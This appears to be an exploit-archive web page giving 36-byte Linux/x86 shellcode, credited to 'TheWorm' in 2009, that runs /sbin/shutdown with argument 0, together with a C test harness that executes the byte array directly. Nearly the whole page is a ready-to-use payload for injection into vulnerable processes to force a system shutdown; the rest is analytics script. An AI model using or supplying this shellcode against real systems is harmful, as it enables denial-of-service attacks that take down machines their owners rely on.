<html><head><title>Linux/x86 - execve(/sbin/shutdown,/sbin/shutdown 0) - 36 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;

const char shellcode[]=
	&quot;\x6a\x0b&quot;		// push	$0xb
	&quot;\x58&quot;			// pop	%eax
	&quot;\x99&quot;			// cltd
	&quot;\x52&quot;			// push	%edx
	&quot;\x68\x64\x6f\x77\x6e&quot;	// push	$0x6e776f64
	&quot;\x68\x73\x68\x75\x74&quot;	// push	$0x74756873
	&quot;\x68\x69\x6e\x2f\x2f&quot;	// push	$0x2f2f6e69
	&quot;\x68\x2f\x2f\x73\x62&quot;	// push	$0x62732f2f
	&quot;\x89\xe3&quot;		// mov	%esp,%ebx
	&quot;\x52&quot;			// push	%edx
	&quot;\x6a\x30&quot;		// push	$0x30
	&quot;\x52&quot;			// push	%edx
	&quot;\x53&quot;			// push	%ebx
	&quot;\x89\xe1&quot;		// mov	%esp,%ecx
	&quot;\xcd\x80&quot;;		// int	$0x80

int main()
{
	printf	(&quot;\n[+] Linux/x86 execve(/sbin/shutdown,/sbin/shutdown 0)&quot;
		&quot;\n[+] Date: 11/07/2009&quot;
		&quot;\n[+] Author: TheWorm&quot;
		&quot;\n\n[+] Shellcode Size: %d bytes\n\n&quot;, sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
